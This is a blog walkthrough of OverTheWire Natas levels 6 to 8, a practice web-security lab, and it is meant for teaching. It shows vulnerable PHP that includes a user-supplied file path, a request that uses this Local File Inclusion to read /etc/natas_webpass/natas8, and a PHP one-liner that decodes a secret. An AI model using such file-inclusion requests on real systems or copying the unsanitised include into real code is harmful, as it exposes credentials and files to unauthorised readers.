Part one [here](http://abatchy.blogspot.ca/2016/10/natas-
level-0-level-5.html).  
  
_Many challenges from now on will show you the source code behind it. Some of
these implementations are quite similar to what is actually used in
production, so it's both valuable to know how they work as well as how you can
exploit them. _  
  

## Natas 6

In this level you need to submit a secret password, going through the source
code you'll realize it's stored in
"`[includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc)`".
But why is it shown as blank? Check the source code, you'll realize it's
stored in PHP tags.  
  
  

    
    
    1  
    2  
    3

|

    
    
    <?  
    $secret = "FOEIUWGHFEEUHOFUOIU";  
    ?>  
      
  
---|---  
  
  
 Submitting the secret keyword in the form will reveal our next password.  
  
![](data:image/png;base64,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)  
 `Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`  

## Natas 7

2 pages beside the index page exist, **Home** and **About**. They don't seem
to be particularly useful but the way the url is constructed [definitely
is](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion). You'll
also notice a hint in both pages in the source code:

    
    
    <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

  
 You may have realized already that this is a Local File Inclusion
vulnerability, if not check the OWASP link previously mentioned. LFI is one of
many web application vulnerabilities where the parameters are not properly
sanitized. The url is in the following format:  
  
http://natas7.natas.labs.overthewire.org/index.php?page=**&lt;filename&gt;**  
  
Code behind it possibly looks like this:  
  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12

|

    
    
    <?php  
     $file = $_GET['page'];  
      
     if(isset($file))   
     {  
      include($file);  
     }  
     else  
     {  
      include("index.php");  
     }  
    ?>  
      
  
---|---  
  
  
 A simple request with the full path of the password file will do.  
  
Hitting
<http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8>
will reveal the password.  

## Natas 8

  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12  
    13  
    14  
    15  
    16

|

    
    
    <?  
      
    $encodedSecret = "3d3d516343746d4d6d6c315669563362";  
      
    function encodeSecret($secret) {  
        return bin2hex(strrev(base64_encode($secret)));  
    }  
      
    if(array_key_exists("submit", $_POST)) {  
        if(encodeSecret($_POST['secret']) == $encodedSecret) {  
        print "Access granted. The password for natas9 is <censored>";  
        } else {  
        print "Wrong secret";  
        }  
    }  
    ?>  
      
  
---|---  
  
  
In this challenge we need to submit a secret pass which should match the
string $encodedSecret. One approach is to brute force the solution till it
works (BAD!), the more obvious one is reversing whatever the encodedSecret
method does.  
  
Fire up a terminal with PHP installed, let's write the code for the reverse
function:  
  
  

    
    
    1  
    2

|

    
    
    root@kali:~# php -r '$passKey=base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));echo $passKey;'  
    oubWYf2kBqr  
      
  
---|---  
  
Submitting "oubWYf2kBqr" in the form will reveal the password.  
  
  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAADwCAIAAADgnKU7AAAgAElEQVR4nO2d244bR364+Rx+hZVBPYPfINnV3ti8140AX2RW8F4qEGDKEAzDSaCFM3v4705kR+sMHVmRR3MiOcM5yDGSCQZ/GA6CDbRGYCsjS45kbyJ7w1w0u7vOXV1dZLPJ78NccJrdVcWqZn39qyp2t/4RAAAAYtCquwAAAAALAk4FAACIg5dTPwYAAFhiIjg1S+s+AADAEuMpV6tTFZseHx8fpRwCAAAsNJnyjo+PFbOWdqoo1OPj48PDw4ODg4ODg9FoNBqN9gEAABaaxHeJ+w4PDzOzurVqdWpy8NHRUaLSvb294XA4GAz6KbsAAAALR6a5wWAwHA739vYSuR4dHWVaDXHq8fHxwcHB/v7+cDjs9/s7OztbW1ubm5v3AAAAFprNzc2tra2dnZ1+vz8cDvf39w8ODpJotZxTsyD18PBwNBoNh8MzgUcyX8k81nhi4msP/gsAAEDDxyBG9eiGUhSmCE5033A4HI1Gh4eH7lDV6tQkSN3b2+v3+2FCLWvTKlX8FAAAGsuUFOtjVk+t9vv9vb29wlDV6tRkJnU4HO7s7OhCLWvTih6tu7kBAKBOKvq1ilkTA+7s7AyHw2xWNcSpo9FoMBhsbW1VEWqASutuOwAAmHcC5FpFq1tbW4PBYDQaVXJqv9/f3Nz0FKpPeBrFo88AAGChieLXsgGrQ6ubm5v9fj/cqYeHh/v7+/1+/969ewFC9bQp7gQAAH8C5FoqYLVp9d69e/1+f39/P1mmFMGpwUItpdKy9fsNAAAsBBH9WmjWslqN49Td3V2jU21CDbMp4gQAAAdhfi1lVptWM6fu7u5Gc2p1oZZSad3NBwAA80spuUbRakynlhVqmE39a/NbAABYaCr6tZRZfbQ6FadWF2pZldbdrAAAMC+UlWtErcZ3almhBts0uLr/AAAAjSK6X0uZ1V+rU3RqdaEGq7Tu1gcAgNkRLNeIWp2KU4OFWmhTDAoAAJ6UkqvDrGW1GtOpxlHfskL1t2nZKv5vAABoOLHk6jZrKa2K7puKU41BaoBQw1Rad4sDAMCsCZNrFa0aQ9X4To0i1LI2rbs1AQBgXqhi1opanaJTjaO+RqEWhqdVPPo/AACwcFTxq3/AatSqYwQ4slPdQWqAUMvatO5WBgCAeqho1jCtKqHqtJzqHvX1Ge/1V2nd7QgAAPOFv1x9xoE9R4AjO9Vz1Nc4hxogVP/KfQ4AAAtEFbn6a9U4t+oeAZ6uUz1Hfd1CDbBp3c0NAACzo7pZC7XqOQIc36meQapt1NctVDwKAAAO/M3q0KrnCLAeqk7RqRWF6mnTsEr/DgAAGkJcuTrMWkWrc+HUKkLFnQAAy0ywWctqtTanzkaoeBQAAETKmnVKWp0Lp9qEWsqmdTcoAADUT7BZjVqt06lxg1R/oQZU+vcAANAQIprVodUooWr9TvUMUoNtWvfJAAAA8Qk261RD1Vk41TNILSVUPAoAAAllzeqjVZ9QdRZOrR6kVhFq3S0LAAD1EEWrFUPV2TnVM0h1C3UaNv0jAADMGTMwa6FWHaFqbU71CVJto76eQsWdAABLQkWzOrTqHgH2HP6dllNLDfwGCxW